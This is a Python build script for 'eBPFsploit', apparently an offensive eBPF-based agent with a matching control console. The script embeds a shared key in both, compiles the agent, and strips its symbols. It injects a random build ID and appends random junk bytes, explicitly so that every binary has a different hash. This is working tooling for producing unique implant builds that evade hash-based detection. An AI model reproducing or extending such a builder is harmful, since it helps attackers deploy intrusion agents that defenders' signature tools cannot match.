#!/usr/bin/env python3
"""
eBPFsploit Integrated Build Script
========================
Features:
  1. Generate random UUID as Pre-Shared Key (PSK)
  2. Hardcode PSK into agent.c and console.py
  3. Inject random build_id to change binary Hash
  4. Compile Agent and strip symbol table
  5. Append random junk data at the end of binary

Usage:
  python3 builder.py                  # Run from agent/ directory
  python3 agent/builder.py            # Run from project root (used by Makefile)
"""

import os
import sys
import uuid
import random
import string
import re

# Path adaptation: supports running from project root or agent/ directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
AGENT_SRC = os.path.join(SCRIPT_DIR, "agent.c")
AGENT_BIN = os.path.join(SCRIPT_DIR, "agent")
CONSOLE_SRC = os.path.join(PROJECT_ROOT, "console", "console.py")
TEMP_BUILD = os.path.join(SCRIPT_DIR, "temp_build.c")

PSK_PLACEHOLDER = "__EBPFSPLOIT_PSK__"
# Match placeholder or replaced UUID (compatible with repeated builds)
PSK_PATTERN = re.compile(
    r'(?:__EBPFSPLOIT_PSK__|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
)


def generate_junk(n=32):
    return ''.join(random.choices(string.ascii_letters, k=n))


def generate_psk():
    return str(uuid.uuid4())


def patch_psk_in_file(filepath, psk, in_place=False):
    """替换文件中的 PSK 占位符（或旧 UUID）为新 PSK"""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = PSK_PATTERN.sub(psk, content)

    if in_place:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
    return new_content


def restore_psk_in_file(filepath):
    """Restore PSK in file to placeholder (for clean)"""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = PSK_PATTERN.sub(PSK_PLACEHOLDER, content)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)


def build_agent(psk):
    """Build unique Agent binary"""
    # 1. Read agent.c and replace PSK
    patched_code = patch_psk_in_file(AGENT_SRC, psk, in_place=False)

    # 2. Inject random build_id to change Hash
    junk_str = f'\nconst char *build_id = "{generate_junk(32)}";\n'
    patched_code = patched_code.replace("int main", junk_str + "int main")

    # 3. Write to temporary file
    with open(TEMP_BUILD, "w", encoding="utf-8") as f:
        f.write(patched_code)

    # 4. Compile
    print("[*] Compiling Agent with embedded PSK...")
    ret = os.system(f"gcc -O2 {TEMP_BUILD} -o {AGENT_BIN} -lbpf -lelf -lz")
    if ret != 0:
        print("[-] Compilation failed!")
        os.remove(TEMP_BUILD)
        sys.exit(1)

    # 5. Strip symbol table
    os.system(f"strip -s {AGENT_BIN}")

    # 6. Append random junk data
    with open(AGENT_BIN, "ab") as f:
        f.write(os.urandom(random.randint(16, 64)))

    # 7. Cleanup temporary file
    os.remove(TEMP_BUILD)


def build():
    psk = generate_psk()

    print(f"[+] Generated PSK: {psk}")
    print()

    # Build Agent (using temporary file, does not modify source)
    build_agent(psk)
    print(f"[+] Agent built: {AGENT_BIN}")

    # Write PSK to console.py (in-place modification)
    patch_psk_in_file(CONSOLE_SRC, psk, in_place=True)
    print(f"[+] PSK injected into: {CONSOLE_SRC}")

    print()
    print(f"[+] Build complete. Agent and Console share the same PSK.")
    print(f"    PSK = {psk}")


def clean():
    """Restore PSK in console.py to placeholder"""
    if os.path.exists(CONSOLE_SRC):
        restore_psk_in_file(CONSOLE_SRC)
        print(f"[+] Restored PSK placeholder in {CONSOLE_SRC}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "clean":
        clean()
    else:
        build()
